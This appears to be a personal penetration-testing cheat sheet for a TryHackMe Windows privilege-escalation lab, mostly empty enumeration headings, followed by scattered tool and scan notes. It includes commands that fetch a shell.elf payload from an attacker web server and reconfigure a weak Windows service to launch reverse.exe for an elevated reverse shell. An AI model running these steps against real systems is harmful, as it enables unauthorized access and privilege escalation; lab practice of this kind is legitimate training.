# 1. TEST SETUP/ENVIRONMENT

## TRYHACKME
```
https://tryhackme.com/room/windows10privesc
```


## FILE TRANSFER - WEB BASED
```
cd /var/www/html/priv_esc
python3 -m http.server
wget http://10.18.5.137:8000/shell.elf
```

## FILE TRANSFER - SMB BASED



# 2. MANUAL ENUMERATION 

## USERS
```

```

## HOSTNAME
```
hostname
```

## OS VERSION & ARCHITECTURE
```

```

## RUNNING PROCESS & SERVICES
```

```

## NETWORK INFORMATION 
```

```

## FIREWALL STATUS AND RULES
```

```

## SCHEDULED TASKS
```

```

## INSTALLED APPS & PATCH LEVELS
```

```

## READABLE/WRITABLE FILES AND DIRECTORIES
```

```

## UNMOUNTED DISKS
```

```

## DEVICE DRIVERS AND KERNEL MODULES
```

```

## BINARIES THAT AUTO ELEVATE
```

```

# 3. AUTOMATED ENUMERATION 

## WINPEAS
```

```




# 4. MISCONFIGURATIONS/VULNERABILITIES EXPLOITATION 

## CATEGORY "SERVICES" - INSECURE SERVICE PERMISSIONS
```
.\winPEASany.exe servicesinfo (powershell)
winPEASany.exe servicesinfo (cmd)

accesschk.exe /accepteula -uwcqv user daclsvc
sc qc daclsvc
sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
sc qc daclsvc
sc start daclsvc
```




zenmap
Kali Linux
vmware player
Kali Linux 
nessus
burpsuite
lightsoot
greenshot
7-zip
notepad++
visul studio code
wireshark

sslscan 172.16.3.17:3389

SMB Signing not required
enum4linux -a 172.16.3.13   

postgres pentest
openvpn server 1194 pentest

SSL CERTIFICATE CANNOT BE TRUSTED
https://shagihan.medium.com/what-is-certificate-chain-and-how-to-verify-them-be429a030887

└─$ curl -I https://shhq.datalines.com.sg/index.jsp








